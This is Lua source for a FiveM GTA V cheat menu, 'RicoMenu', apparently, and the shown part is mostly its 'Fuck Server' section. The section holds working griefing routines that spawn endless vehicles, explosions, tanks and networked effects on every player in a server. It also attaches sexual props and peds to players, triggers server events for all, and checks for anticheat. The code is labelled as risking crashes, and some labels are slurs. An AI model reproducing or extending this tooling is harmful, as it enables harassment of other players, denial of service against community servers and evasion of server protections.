    RicoMenu.CreateSubMenu('sports', 'vehiclespawner', 'Sports')
    RicoMenu.CreateSubMenu('super', 'vehiclespawner', 'Super')
    RicoMenu.CreateSubMenu('motorcycles', 'vehiclespawner', 'Motorcycles')
    RicoMenu.CreateSubMenu('offroad', 'vehiclespawner', 'Off-Road')
    RicoMenu.CreateSubMenu('industrial', 'vehiclespawner', 'Industrial')
    RicoMenu.CreateSubMenu('utility', 'vehiclespawner', 'Utility')
    RicoMenu.CreateSubMenu('vans', 'vehiclespawner', 'Vans')
    RicoMenu.CreateSubMenu('cycles', 'vehiclespawner', 'Cycles')
    RicoMenu.CreateSubMenu('boats', 'vehiclespawner', 'Boats')
    RicoMenu.CreateSubMenu('helicopters', 'vehiclespawner', 'Helicopters')
    RicoMenu.CreateSubMenu('planes', 'vehiclespawner', 'Planes')
    RicoMenu.CreateSubMenu('service', 'vehiclespawner', 'Service')
    RicoMenu.CreateSubMenu('commercial', 'vehiclespawner', 'Commercial')
    
    -- VEHICLE MODS SUBMENUS
    RicoMenu.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
    RicoMenu.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
    RicoMenu.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')
    
    RicoMenu.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
    RicoMenu.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
    RicoMenu.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')
    
    RicoMenu.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
    RicoMenu.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
    RicoMenu.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')
    
    RicoMenu.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')
    
    -- WORLD MENU SUBMENUS
    RicoMenu.CreateSubMenu('objectspawner', 'skid', 'Object Spawner')
    RicoMenu.CreateSubMenu('objectlist', 'objectspawner', 'Select To Delete')
    RicoMenu.CreateSubMenu('weather', 'world', 'Weather Changer ~b~(CLIENT SIDE)')
    RicoMenu.CreateSubMenu('time', 'world', 'Time Changer')
    
    -- MISC MENU SUBMENUS
	RicoMenu.CreateSubMenu('esp', 'misc', 'ESP & Visual Options')
	RicoMenu.CreateSubMenu('webradio', 'misc', 'Web Radio')
    RicoMenu.CreateSubMenu('credits', 'misc', 'Credits')
    
    -- TELEPORT MENU SUBMENUS
    RicoMenu.CreateSubMenu('saveload', 'teleport', 'Save/Load Position')
    RicoMenu.CreateSubMenu('pois', 'teleport', 'POIs')
	--fuck server
	RicoMenu.CreateSubMenu('fuckserver', 'skid', 'Fuck Server')
    
    -- LUA MENU SUBMENUS
    RicoMenu.CreateSubMenu('esx', 'lua', 'ESX Options')
    RicoMenu.CreateSubMenu('vrp', 'lua', 'QB Spawm Items')
    RicoMenu.CreateSubMenu('player1', 'lua', 'Esx Jobs')
	RicoMenu.CreateSubMenu('other', 'player1', 'Esx Jobs')
	RicoMenu.CreateSubMenu('money', 'lua', 'Money Servers')
	RicoMenu.CreateSubMenu('drogas', 'lua', 'Drogs Farm')
	RicoMenu.CreateSubMenu('mecanico', 'lua', 'Custom Scripts')
    
    RicoMenu.InitializeTheme()
    
    while true do
        
        -- MAIN MENU
        if RicoMenu.IsMenuOpened('skid') then
            if RicoMenu.MenuButton('Online Options', 'player') then
            elseif RicoMenu.MenuButton('~o~Self Options', 'self') then  
			elseif RicoMenu.MenuButton('Models Options', 'appearance') then
            elseif RicoMenu.MenuButton('Weapon Options', 'weapon') then
            elseif RicoMenu.MenuButton('Vehicle Options', 'vehicle') then
            elseif RicoMenu.MenuButton('World Options', 'world') then
			elseif RicoMenu.MenuButton('Teleport Options', 'teleport') then
            elseif RicoMenu.MenuButton('Visual Options', 'misc') then
			elseif RicoMenu.MenuButton('Objects Options', 'objectspawner') then
			elseif RicoMenu.MenuButton('~r~Fuck Server', 'fuckserver') then
            elseif RicoMenu.MenuButton('~b~Lua Options', 'lua') then
            elseif RicoMenu.Button('~y~Exit Menu') then break
            end
            ShowInfo(motd2)
	        ShowInfo(motd)
	        ShowInfo(motd5)
        
        
        elseif RicoMenu.IsMenuOpened('player') then
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if RicoMenu.MenuButton("ID: ~g~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer).."~y~ » "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~u~[ 💀 ]" or "~u~[ 😈 ]"), 'playeroptions') then
                        selectedPlayer = currPlayer end
                end
      
			
			
			
		
		elseif RicoMenu.IsMenuOpened('fuckserver') then
		    if RicoMenu.CheckBox("Include Self", includeself, "No", "Yes") then
                includeself = not includeself
            elseif RicoMenu.Button("~g~ [NEW] ~w~Destroy ~y~Server ~w~Drop ~b~Boat V2 + ~p~Shake Players Screen💥") then
                local function spawnBoatsAbovePlayers()
                    while true do
                        Citizen.Wait(1000)  
                
                        local players = GetActivePlayers()  
                
                        for _, playerId in ipairs(players) do
                            local playerPed = GetPlayerPed(playerId)
                            local playerCoords = GetEntityCoords(playerPed)
                
                            
                            local spawnCoords = vector3(playerCoords.x + math.random(-2, 2), playerCoords.y + math.random(-2, 2), playerCoords.z + 50)
                
                            
                            local boatHash = GetHashKey("tug")  
                            RequestModel(boatHash)
                
                            while not HasModelLoaded(boatHash) do
                                Citizen.Wait(100)
                            end
                
                            
                            local boat = CreateVehicle(boatHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, 0.0, true, false)
                
                            
                            SetVehicleEngineHealth(boat, 0)  
                            AddExplosion(spawnCoords.x, spawnCoords.y, spawnCoords.z, 2, 10.0, true, false, 1.0)  
                        end
                    end
                end
                
                
                Citizen.CreateThread(function()
                    spawnBoatsAbovePlayers()
                end)                           
            elseif RicoMenu.Button("~g~ [NEW] ~w~Drop 20+ ~p~Cars ~w~From ~b~Sky ~y~All Players 🚗") then 
                local vehicles = {
                    "adder", "banshee", "cheetah", "entityxf", "infernus", "turismor", "zentorno", "massacro", 
                    "buffalo", "carbonizzare", "comet2", "elegy", "futo", "jester", "kuruma", "ninef", "pariah", 
                    "rapidgt", "schafter2", "vagner", "tempesta", "voltic", "x80", "tyrus",
                    "akuma", "bati", "carbonrs", "double", "hakuchou", "hexer", "nemesis", "pcj", "sanchez", 
                    "vader", "vindicator", "zombiea", "zombieb",
                    "barracks", "biff", "bison", "bobcatxl", "boxville", "burrito", "camper", "docktug", "flatbed", 
                    "guardian", "mule", "packer", "phantom", "pounder", "rubble", "sadler", "scrap", "stockade", 
                    "towtruck", "tractor2", "trophytruck",
                    "baller", "blazer", "bodhi", "dubsta", "dune", "fq2", "granger", "huntley", "landstalker", 
                    "mesa", "patriot", "rancherxl", "rebel", "sandking", "seminole", "xls",
                    "insurgent", "kuruma2", "nightshark", "rhino", "tampa3", "halftrack", "chernobog", 
                    "barrage", "technical", "wastelander", "crusader", "apc", "scarab",
                    "dilettante", "issi2", "panto", "prairie", "rhapsody", "stinger", "tornado", "weevil",
                    "youga", "moonbeam", "slamvan", "surfer", "stretch", "emperor", "faction", "glendale"
                }
                
                Citizen.CreateThread(function()
                    while true do
                        for _, playerId in ipairs(GetActivePlayers()) do
                            local playerPed = GetPlayerPed(playerId)
                            local playerPos = GetEntityCoords(playerPed)
                            local vehicleModel = vehicles[math.random(#vehicles)]
                
                            
                            RequestModel(vehicleModel)
                            while not HasModelLoaded(vehicleModel) do
                                Wait(0)
                            end
                
                            
                            local spawnPos = vector3(playerPos.x, playerPos.y, playerPos.z + 10) 
                            local spawnedVehicle = CreateVehicle(vehicleModel, spawnPos.x, spawnPos.y, spawnPos.z, GetEntityHeading(playerPed), true, false)
                
                            
                            SetModelAsNoLongerNeeded(vehicleModel)
                        end
                        Wait(100) 
                    end
                end)                               
            elseif RicoMenu.Button("~g~ [NEW] ~w~Alarm ~r~Sound ~y~All Players 🚨") then 
                local RicoAlarm = true  
                Citizen.CreateThread(function()
                    while RicoAlarm do
                        Citizen.Wait(0)  
                
                        local players = GetActivePlayers()  
                
                        for _, playerId in ipairs(players) do
                            local playerPed = GetPlayerPed(playerId)  
                            
                            
                            for _, sound in pairs({{name = 'CHECKPOINT_AHEAD', dict = 'HUD_MINI_GAME_SOUNDSET'}}) do
                                PlaySoundFromCoord(-1, sound.name, GetEntityCoords(playerPed), sound.dict, true, 1.0, true)  
                            end
                        end
                    end
                end)                                          
            elseif RicoMenu.Button("~r~Nuke Server ~o~Drop ~b~Boat ~y~All Players ⛵") then
                Citizen.CreateThread(function()
                    RequestModel(GetHashKey("kosatka")) 
                    while not HasModelLoaded(GetHashKey("kosatka")) do
                        Citizen.Wait(0)
                    end
                
                    while true do
                        Citizen.Wait(10)
                        
                        local players = GetActivePlayers() 
                        for _, playerId in ipairs(players) do
                            local playerPed = GetPlayerPed(playerId)
                            local x, y, z = table.unpack(GetEntityCoords(playerPed, true)) 
                
                            local v = CreateVehicle(GetHashKey("kosatka"), x, y, z, 0.0, true, true) 
                            SetEntityInvincible(v, true) 
                        end
                    end
                end)                                   
            elseif RicoMenu.Button("~r~Nuke ~b~Players ~y~15 Seconds ☢️ ~r~[RISK LOGS]") then 
                CreateThread(function()
    
                    for i = 1, 1000 do
                       
                        CreateThread(function()
                            local model = GetHashKey('bus')
                
                           
                            while not HasModelLoaded(model) do
                                RequestModel(model)
                                Wait(0)
                            end
                
                            
                            for _, playerId in ipairs(GetActivePlayers()) do
                                local ped = GetPlayerPed(playerId)
                
                                
                                local car = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(ped, 0.0, -8.0, 0.0), GetEntityHeading(ped), true, true)
                
                                
                                SetVehicleForwardSpeed(car, 750/3.6)
                                SetEntityVisible(car, false)
                
                               
                                Wait(250)
                                DeleteEntity(car)
                            end
                        end)
                        
                        
                        Wait(15)
                    end
                end) 
            elseif RicoMenu.Button("~p~Arabic ~r~Suicide ~y~All Server 🐪") then
local model = GetHashKey('mp_m_freemode_01')

if not HasModelLoaded(model) then
    RequestModel(model)
    while not HasModelLoaded(model) do
        Wait(0)
    end
end


for _, playerId in ipairs(GetActivePlayers()) do
    local pped = GetPlayerPed(playerId)
    
    
    local ped = CreatePed(5, model, GetOffsetFromEntityInWorldCoords(pped, 0.0, -1.0, -1.0), GetEntityHeading(pped), true, true)
    
    
    SetPedDefaultComponentVariation(ped)
    SetPedHeadBlendData(ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
    SetPedComponentVariation(ped, 1, 115, 0, 2)
    SetPedComponentVariation(ped, 3, 4, 0, 2)
    SetPedComponentVariation(ped, 11, 12, 0, 2)
    SetPedComponentVariation(ped, 8, 15, 0, 2)
    SetPedComponentVariation(ped, 4, 56, 0, 2)
    SetPedComponentVariation(ped, 6, 34, 0, 2)
    
    
    CreateThread(function()
        PlayPain(ped, 6, 0, 0)
        Wait(500)
        AddExplosion(GetEntityCoords(ped), 34, 500.0, true, false, true)
    end)
end                                               
            elseif RicoMenu.Button("~w~PED ~p~Fuck ~y~All Players 👴") then
                local spawnedPeds = {}

                
                function handlePlayerPeds()
                    local players = GetActivePlayers() 
                
                    for _, playerId in ipairs(players) do
                        local serverId = GetPlayerServerId(playerId)
                        local playerPed = GetPlayerPed(playerId)
                
                        
                        print("Attempting to spawn ped for player with serverId: " .. tostring(serverId) .. " and playerPed: " .. tostring(playerPed))
                
                        if not anticheatRunning then
                            if not spawnedPeds[serverId] then
                                local pedModel = GetHashKey('a_m_y_acult_01')
                
                                
                                RequestModel(pedModel)
                                while not HasModelLoaded(pedModel) do
                                    Wait(0)
                                end
                
                                
                                local ped = CreatePed(5, pedModel, GetEntityCoords(playerPed), GetEntityHeading(playerPed), true, true)
                                spawnedPeds[serverId] = ped
                
                                SetPedDefaultComponentVariation(ped)
                
                                
                                AttachEntityToEntity(ped, playerPed, 11816, 0.0, -0.7, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                
                                
                                print("Ped created and attached for player with serverId: " .. tostring(serverId))
                
                                
                                CreateThread(function()
                                    while true do
                                        if not IsEntityPlayingAnim(ped, 'rcmpaparazzo_2', 'shag_loop_a', 3) then
                                            RequestAnimDict('rcmpaparazzo_2')
                                            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                                                Wait(0)
                                            end
                                            TaskPlayAnim(ped, 'rcmpaparazzo_2', 'shag_loop_a', 8.0, -8.0, -1, 1, 0, false, false, false)
                                        end
                                        Wait(0)
                                    end
                                end)
                            end
                        else
                            
                            Toggles[playerId] = false
                            AnticheatWarning()
                        end
                    end
                end
                
                
                handlePlayerPeds()
            elseif RicoMenu.Button("~b~NewsPapers ~r~Fire ~y~All Players ⚡ [LOOP]") then
                                        -- Initialize RicoEffect3
local RicoEffect3 = false -- Change this based on your condition to activate it

-- Example of setting RicoEffect3 to true for testing purposes
Citizen.CreateThread(function()
    Citizen.Wait(5000) -- Wait 5 seconds before setting RicoEffect3 to true
    RicoEffect3 = true -- Simulate RicoEffect3 being activated
end)

-- Function to handle RicoEffect3 for all players
local function HandleRicoEffect3()
    local players = GetActivePlayers()

    for _, playerId in ipairs(players) do
        local ped = GetPlayerPed(playerId)
        local pedPos = GetEntityCoords(ped)

        -- Request the particle effect asset
        RequestNamedPtfxAsset("core")
        while not HasNamedPtfxAssetLoaded("core") do
            Citizen.Wait(0) -- Wait until the particle effect is loaded
        end

        -- Trigger finger movement animation (optional)
        CellCamMoveFinger(5)

        -- Apply the particle effect at the player's position
        UseParticleFxAsset("core")
        StartNetworkedParticleFxNonLoopedAtCoord(
            "exp_air_rpg_plane_sp", -- Particle effect name
            pedPos.x, pedPos.y, pedPos.z, -- Player coordinates
            0.0, 0.0, 1.0, -- Rotation
            1.0, false, false, false -- Scale and flags
        )
    end
end

-- Main thread for handling RicoEffect3
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000) -- Wait 1 second

        -- If RicoEffect3 is true, trigger the effect for all players
        if RicoEffect3 then
            HandleRicoEffect3()
        end
    end
end)               
            elseif RicoMenu.Button("~b~TX ~p~Effect ~y~All Players ⚡ [LOOP]") then
                -- Ensure RicoEffect2 is initialized and properly set (for testing, we can set it to true)
local RicoEffect2 = false -- Initialize as false

-- Example of setting RicoEffect2 to true for testing purposes
Citizen.CreateThread(function()
    Citizen.Wait(5000) -- Wait 5 seconds before setting RicoEffect2 to true
    RicoEffect2 = true -- Simulate RicoEffect2 being activated
end)

-- Function to handle RicoEffect2 for all players
local function HandleRicoEffect2()
    local players = GetActivePlayers()

    for _, playerId in ipairs(players) do
        local ped = GetPlayerPed(playerId)
        local pedPos = GetEntityCoords(ped)

        -- Request the particle effect asset
        RequestNamedPtfxAsset("scr_trevor1")
        while not HasNamedPtfxAssetLoaded("scr_trevor1") do
            Citizen.Wait(0) -- Wait until the particle effect is loaded
        end

        -- Trigger finger movement animation (optional)
        CellCamMoveFinger(5)

        -- Apply the particle effect at the player's position
        UseParticleFxAsset("scr_trevor1")
        StartNetworkedParticleFxNonLoopedAtCoord(
            "scr_trev1_trailer_boosh", -- Particle effect name
            pedPos.x, pedPos.y, pedPos.z, -- Player coordinates
            0.0, 0.0, 1.0, -- Rotation
            1.0, false, false, false -- Scale and flags
        )
    end
end

-- Main thread for handling RicoEffect2
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000) -- Wait 1 second

        -- If RicoEffect2 is true, trigger the effect for all players
        if RicoEffect2 then
            HandleRicoEffect2()
        end
    end
end)
elseif RicoMenu.Button("~r~Whore ~y~On Head All Players 👠") then
    local model = GetHashKey('mp_f_deadhooker')

    -- בודק אם המודל נטען לפני שמשתמשים בו
    RequestModel(model)
    while not HasModelLoaded(model) do
        Wait(0)
    end
    
    -- מחזור שעובר על כל השחקנים בשרת
    for _, playerId in ipairs(GetActivePlayers()) do
        local p_ped = GetPlayerPed(playerId)  -- מקבל את הפד של השחקן
    
        -- יוצר את הפד עם המודל שנטען
        local ped = CreatePed(5, model, GetOffsetFromEntityInWorldCoords(p_ped, 0.0, -2.0, -1.0), GetEntityHeading(p_ped), true, true)
    
        -- מחבר את הפד החדש לשחקן
        AttachEntityToEntity(ped, p_ped, 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
    
        -- טוען את האנימציה
        RequestAnimDict('anim@heists@prison_heistunfinished_biztarget_idle')
        while not HasAnimDictLoaded('anim@heists@prison_heistunfinished_biztarget_idle') do
            Citizen.Wait(100)
        end
    
        -- מתחיל את האנימציה
        TaskPlayAnim(ped, "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
    
        -- מוודא שהפד ישמור על האנימציה ויהיה חסין
        SetPedKeepTask(ped, true)
        TaskSetBlockingOfNonTemporaryEvents(ped, true)
        SetEntityInvincible(ped, true)
    end
            elseif RicoMenu.Button("~o~Smoke ~w~From ~p~Ass ~y~All Players 🚬") then
                local RicoSmokeFromAss = false 

                
                Citizen.CreateThread(function()
                    Citizen.Wait(5000) 
                    RicoSmokeFromAss = true 
                end)
                
                
                local function HandleParticleEffectForRicoSmokeFromAss()
                    local players = GetActivePlayers()
                
                    for _, playerId in ipairs(players) do
                        local ped = GetPlayerPed(playerId)
                        local pedPos = GetEntityCoords(ped)
                
                        
                        RequestNamedPtfxAsset("core")
                        while not HasNamedPtfxAssetLoaded("core") do
                            Citizen.Wait(0)
                        end
                
                        
                        CellCamMoveFinger(5)
                
                        
                        for i = 1, 15 do 
                            
                            UseParticleFxAsset("core")
                            StartNetworkedParticleFxNonLoopedAtCoord(
                                "ent_anim_cig_exhale_mth_car", 
                                pedPos.x + math.random() * 0.3 - 0.15, 
                                pedPos.y + math.random() * 0.3 - 0.15, 
                                pedPos.z + math.random() * 0.2, 
                                0.0, 0.0, 0.0, 
                                1.0, false, false, false 
                            )
                        end
                    end
                end
                
                
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(1000) 
                
                        
                        if RicoSmokeFromAss then
                            HandleParticleEffectForRicoSmokeFromAss()
                        end
                    end
                end)                                                                    
            elseif RicoMenu.Button("~s~Drop ~p~Car On ~b~All Nearby ~y~Players 🚗") then
                local car = 'adder'
                local vehicleName = GetHashKey(car)
                
                RequestModel(vehicleName)
                while not HasModelLoaded(vehicleName) do
                    Wait(500)
                end
                
                
                local function GetAllPlayers()
                    local players = {}
                    for i = 0, 255 do
                        if NetworkIsPlayerActive(i) then
                            table.insert(players, i)
                        end
                    end
                    return players
                end
                
                
                local function DropVehiclesOnPlayers()
                    local players = GetAllPlayers()
                    local currentPlayer = PlayerId()
                
                    
                    print("Total players found: " .. #players)
                
                    if #players == 0 then
                        print("No active players found.")
                        return
                    end
                
                    for _, playerId in ipairs(players) do
                        if playerId ~= currentPlayer then
                            local ped = GetPlayerPed(playerId)
                            if ped and ped ~= 0 then
                                local pos = GetEntityCoords(ped)
                                local heading = GetEntityHeading(ped)
                
                                
                                print("Creating vehicle for player: " .. playerId .. " at position: " .. pos.x .. ", " .. pos.y .. ", " .. pos.z)
                
                                
                                local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z + 10, heading, true, false)
                                Citizen.Wait(500) 
                
                                
                                if vehicle and vehicle ~= 0 then
                                    
                                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -1000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                
                                    
                                    SetVehicleAsNoLongerNeeded(vehicle)
                                    SetModelAsNoLongerNeeded(vehicleName)
                                else
                                    print("Failed to create vehicle for player: " .. playerId)
                                end
                            else
                                print("Invalid ped for player: " .. playerId)
                            end
                        end
                    end
                end
                
                
                DropVehiclesOnPlayers()                                                               
			elseif RicoMenu.Button("~y~10k Tanks ~b~Follow You ~r~[Crash Risk + Low FPS] ⚔️") then
                local veh = "Rhino"

                
                local function createVehicleAndNPCs(targetPed)
                    local pos = GetEntityCoords(targetPed)
                    local pitch = GetEntityPitch(targetPed)
                    local roll = GetEntityRoll(targetPed)
                    local yaw = GetEntityRotation(targetPed).z
                    local xf = GetEntityForwardX(targetPed)
                    local yf = GetEntityForwardY(targetPed)
                    local v = nil
                
                    RequestModel(veh)
                    RequestModel('a_m_o_acult_01')
                
                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
                        Citizen.Wait(0)
                        RequestModel(veh)
                        RequestModel('a_m_o_acult_01')
                    end
                
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v = CreateVehicle(veh, pos.x - (xf * 90), pos.y - (yf * 90), pos.z + 1, GetEntityHeading(targetPed), true, false)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('a_m_o_acult_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('a_m_o_acult_01') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
                                local ped1 = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskVehicleEscort(ped, v, targetPed, -1, 250.0, 1082917029, 7.5, 0, -1)
                                    SetDriverAbility(ped, 10.0)
                                    SetDriverAggressiveness(ped, 10.0)
                                end
                            end
                        end
                    end
                end
                
                
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(5000) 
                
                        for _, playerId in ipairs(GetActivePlayers()) do
                            local targetPed = GetPlayerPed(playerId)
                            createVehicleAndNPCs(targetPed)
                        end
                    end
                end)                                                                             
			elseif RicoMenu.Button("~y~[Most QB] ~s~Mugshot ~y~All Server 🏛️") then
                TriggerServerEvent('qb-mugshot:server:triggerSuspect', -1)    
			elseif RicoMenu.Button("~r~Explosive ~y~All Nearby Vehicles ~g~KEY [H] 💥") then                

function explodeNearbyVehicles()
   
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    
    
    local vehicles = GetGamePool('CVehicle')
    
    for _, vehicle in ipairs(vehicles) do
       
        local vehicleCoords = GetEntityCoords(vehicle)
        
        if Vdist(playerCoords, vehicleCoords) < 50.0 then
            
            AddExplosion(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 2, 100.0, true, false, 1.0)
        end
    end
end

-- הוסף לולאת ריצה
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        -- אם נלחץ על מקש H
        if IsControlJustReleased(0, 74) then -- 74 זה הקוד למקש H
            explodeNearbyVehicles()
        end
    end
end)
			elseif RicoMenu.Button("~w~Close ~y~Fleeca Bank Legion ❌") then
				local object = GetHashKey('prop_beach_bars_02')
				local object1 = GetHashKey('prop_beach_bars_02')
				local object2 = GetHashKey('prop_beach_bars_02')
				local object3 = GetHashKey('prop_beach_bars_02')
				local object4 = GetHashKey('prop_beach_bars_02')
				local object5 = GetHashKey('prop_beach_bars_02')
				local object6 = GetHashKey('prop_beach_bars_02')
				local object7 = GetHashKey('prop_beach_bars_02')
				local object8 = GetHashKey('prop_beach_bars_02')
				local object9 = GetHashKey('prop_beach_bars_02')
				local object10 = GetHashKey('prop_beach_bars_02')
				RequestModel(object)
				local time = 0

				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
				end
				
					local ped = PlayerPedId()
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, 150.8, -1037.82, 28.36, true, true, false)
					local CreatedObject = CreateObject(object1, 150.8, -1037.82, 28.36, true, true, false)
					local CreatedObject = CreateObject(object2, 150.8, -1037.82, 27.36, true, true, false)
					local CreatedObject = CreateObject(object3, 150.8, -1037.82, 26.66, true, true, false)
					local CreatedObject = CreateObject(object4, 149.8, -1037.52, 28.36, true, true, false)
					local CreatedObject = CreateObject(object5, 149.8, -1037.52, 28.36, true, true, false)
					local CreatedObject = CreateObject(object6, 149.8, -1037.52, 27.36, true, true, false)
					local CreatedObject = CreateObject(object7, 149.8, -1037.52, 26.66, true, true, false)
					local CreatedObject = CreateObject(object8, 151.8, -1037.52, 28.66, true, true, false)
					local CreatedObject = CreateObject(object9, 151.8, -1037.52, 27.66, true, true, false)
					local CreatedObject = CreateObject(object10, 151.8, -1037.52, 26.66, true, true, false)
			elseif RicoMenu.Button("~w~Small ~r~Dildo ~y~Stand in legion 🥚") then
				local object = GetHashKey('v_ret_fh_dinetable')
				local object1 = GetHashKey('v_res_d_dildo_f')
				local object2 = GetHashKey('v_res_d_dildo_f')
				local object3 = GetHashKey('v_res_d_dildo_f')
				RequestModel(object)
				local time = 0

				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
				end
				
					local ped = PlayerPedId()
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, 161.7, -1002.1, 28.36, true, true, false)
					local CreatedObject = CreateObject(object1, 161.72, -1001.09, 29.35, true, true, false)
					local CreatedObject = CreateObject(object2, 161.72, -1002.09, 29.35, true, true, false)
					local CreatedObject = CreateObject(object3, 161.72, -1003.09, 29.35, true, true, false)
			elseif RicoMenu.Button("~w~Dildo On Face ~y~All Players 🖕") then
				local object = GetHashKey('v_res_d_dildo_c')
				RequestModel(object)
				local time = 0

				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
				end
				
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 0xF18F), 180, 0, 0, 0, 180, 0, false, false, false, false, 2, true)
				end
			elseif RicoMenu.Button("~s~Mountain ~y~City ~r~Fuck All Map 🏔️") then
    CreateThread(function()
        CreateObject(841438406, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
